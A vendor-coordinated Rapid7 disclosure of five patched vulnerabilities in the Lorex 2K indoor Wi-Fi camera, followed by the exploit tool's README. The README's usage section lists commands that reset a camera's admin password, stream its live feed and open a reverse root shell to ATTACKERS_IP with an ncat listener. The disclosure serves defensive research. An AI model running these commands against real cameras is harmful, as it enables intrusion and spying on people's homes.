# Lorex 2K Indoor Wi-Fi Security Camera: Multiple Vulnerabilities (FIXED)

* Dec 03, 2024
* 4 min read
* [Stephen Fewer](/blog/author/sfewer-r7/)

*Last updated at Fri, 06 Dec 2024 21:06:22 GMT*

The [Lorex 2K Indoor Wi-Fi Security Camera](https://www.lorex.com/products/2k-indoor-wi-fi-security-camera) is a consumer security device that provides cloud-based video camera surveillance capabilities. This device was a target at the 2024 Pwn2Own IoT competition. Rapid7 developed an unauthenticated remote code execution (RCE) exploit chain as an entry for the competition. On November 25, 2024, Lorex released a firmware update to resolve the five vulnerabilities that comprise the exploit chain reported by Rapid7. As of December 3, 2024, we are disclosing these issues publicly in coordination with the vendor.

## Technical analysis

A detailed technical analysis for the exploit chain described in this blog can be found in Rapid7’s whitepaper [here](https://www.rapid7.com/globalassets/_pdfs/research/pwn2own-iot-2024-lorex-2k-indoor-wi-fi-security-camera-research.pdf).

The accompanying source code for the exploit chain can be found [here](https://github.com/sfewer-r7/LorexExploit).

The exploit chain consists of five distinct vulnerabilities, which operate together in two phases to achieve unauthenticated RCE. The five vulnerabilities are listed below.

| CVE | Description | Affected Component | CVSS |
| --- | --- | --- | --- |
| CVE-2024-52544 | An unauthenticated attacker can trigger a stack-based buffer overflow. | DP Service (TCP port 3500) | [9.8 (Critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CVE-2024-52545 | An unauthenticated attacker can perform an out-of-bounds heap read. | IQ Service (TCP port 9876) | [6.5 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L) |
| CVE-2024-52546 | An unauthenticated attacker can perform a null pointer dereference. | DHIP Service (UDP port 37810) | [5.3 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L) |
| CVE-2024-52547 | An authenticated attacker can trigger a stack-based buffer overflow. | DHIP Service (TCP port 80) | [7.2 (High)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |
| CVE-2024-52548 | An attacker can bypass code signing enforcements and execute arbitrary native code. | Kernel | [6.7 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |

Phase 1 performs an authentication bypass, allowing a remote unauthenticated attacker to reset the device's admin password to a password of the attacker's choosing. This phase leverages an unauthenticated stack-based buffer overflow, and an unauthenticated out-of-bounds (OOB) heap read vulnerability. The OOB heap read allows an attacker to leak secrets stored in the device’s memory that are required to compute a special code value; this code value is required for an administrator password reset to be performed. A null pointer dereference vulnerability is leveraged to force the device to reboot in order to allow the next phase to complete.

Phase 2 achieves remote code execution by leveraging the auth bypass in phase 1 to perform an authenticated stack-based buffer overflow and execute an operating system (OS) command with root privileges. This capability is then leveraged to write a file to disk and, in turn, bypass the device's code signing enforcement in order to execute arbitrary native code. Finally, the exploit will execute a reverse shell payload to give the remote attacker a root shell on the target device.

An overview of the two phases chained together can be seen below.

## Impact

A remote unauthenticated attacker can leverage CVE-2024-52544, CVE-2024-52545, and CVE-2024-52546 (Phase 1) to reset a target device's admin password, to a password of the attacker’s choosing. With valid admin credentials, an attacker can then either view the live video and audio feed from the device, or proceed to leverage CVE-2024-52547 and CVE-2024-52548 (Phase 2) to achieve remote code execution with root privileges on the target device.

The below table lists the affected devices and firmware versions.

| Device | Firmware |
| --- | --- |
| W461AS-EG | 2.800.00LR000.0.R.210907 |
| W462AQ-EG | 2.800.00LR000.0.R.210907 |
| W461AS | 2.800.00LR000.0.R.210730 |
| W462AQ | 2.800.00LR000.0.R.210730 |
| W461AS-EG S2 | 2.800.0000000.3.R.20220331 |
| W462AC-EG S2 | 2.800.0000000.3.R.20220331 |
| W461AS | 2.800.0000000.3.R.202203 |
| W462AQ | 2.800.0000000.3.R.202203 |
| W461ASC | 2.800.030000000.3.R |

# Lorex 2K Indoor Wi-Fi Security Camera: RCE Exploit Chain

## Overview

The [Lorex 2K Indoor Wi-Fi Security Camera](https://www.lorex.com/products/2k-indoor-wi-fi-security-camera) is a consumer security device that provides cloud-based video camera surveillance capabilities. This device was a target at the 2024 Pwn2Own IoT competition. Rapid7 developed an unauthenticated remote code execution (RCE) exploit chain as an entry for the competition. On November 25, 2024, Lorex released a firmware update to resolve the five vulnerabilities that comprise the exploit chain reported by Rapid7.

The exploit chain consists of five distinct vulnerabilities, which operate together in two phases to achieve unauthenticated RCE. The five vulnerabilities are listed below.

| CVE | Description | Affected Component | CVSSv3.1 |
| --- | --- | --- | --- |
| [CVE-2024-52544](https://www.cve.org/cverecord?id=CVE-2024-52544) | An unauthenticated attacker can trigger a stack based buffer overflow. | DP Service (TCP port 3500) | [9.8 (Critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| [CVE-2024-52545](https://www.cve.org/cverecord?id=CVE-2024-52545) | An unauthenticated attacker can perform an out of bounds heap read. | IQ Service (TCP port 9876) | [6.5 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L) |
| [CVE-2024-52546](https://www.cve.org/cverecord?id=CVE-2024-52546) | An unauthenticated attacker can perform a null pointer dereference. | DHIP Service (UDP port 37810) | [5.3 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L) |
| [CVE-2024-52547](https://www.cve.org/cverecord?id=CVE-2024-52547) | An authenticated attacker can trigger a stack based buffer overflow. | DHIP Service (TCP port 80) | [7.2 (High)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |
| [CVE-2024-52548](https://www.cve.org/cverecord?id=CVE-2024-52548) | An attacker can bypass code signing enforcements and execute arbitrary native code. | Kernel | [6.7 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |

Phase 1 performs an authentication bypass, allowing a remote unauthenticated attacker to reset the device's admin password to a password of the attacker's choosing. This phase leverages an unauthenticated stack based buffer overflow, and an unauthenticated out-of-bounds (OOB) heap read vulnerability. The OOB heap read allows an attacker to leak secrets stored in the device’s memory that are required to compute a special code value; this code value is required for an administrator password reset to be performed. A null pointer dereference vulnerability is leveraged to force the device to reboot in order to allow the next phase to complete.

Phase 2 achieves remote code execution by leveraging the auth bypass in phase 1 to perform an authenticated stack based buffer overflow and execute an Operating System (OS) command with root privileges. This capability is then leveraged to write a file to disk and in turn, bypass the device's code signing enforcement in order to execute arbitrary native code. Finally, the exploit will execute a reverse shell payload to give the remote attacker a root shell on the target device.

## Technical Analysis

A detailed technical analysis for this exploit chain can be found in Rapid7’s whitepaper [here](https://www.rapid7.com/globalassets/_pdfs/research/pwn2own-iot-2024-lorex-2k-indoor-wi-fi-security-camera-research.pdf).

## Usage

To discover a device on the network, the `LOREX_DISCOVER.rb` script can be used. No addition parameters are required, as discovery is performed over broadcast UDP.

```
ruby LOREX_DISCOVER.rb
```

Once the IP addres of a target device has been identified, the auth bypass can be performed via the `LOREX_AUTHBYPASS.rb` script.

```
ruby LOREX_AUTHBYPASS.rb -t TARGET_IP -p Rapid7!!
```

After the auth bypass has succeeded, you can view the live video and audio stream of the target device by visiting the below URL in a suitable video player such as [VLC](https://www.videolan.org/).

```
rtsp://admin:Rapid7!!@TARGET_IP:554/cam/realmonitor?channel=1&subtype=0
```

Finally, a reverse root shell can be achieved via the `LOREX_RCE.rb` script. An IP address and port for the reverse shell to call back to must be supplied.

```
ruby LOREX_RCE.rb -t TARGET_IP -p Rapid7!! --lhost ATTACKERS_IP --lport 4444
```

Running an Ncat listner on the attackers machine will catch the reverse shell (Don't forget to open the listening port in your firewall rules).

```
ncat -lnvkp 4444
```
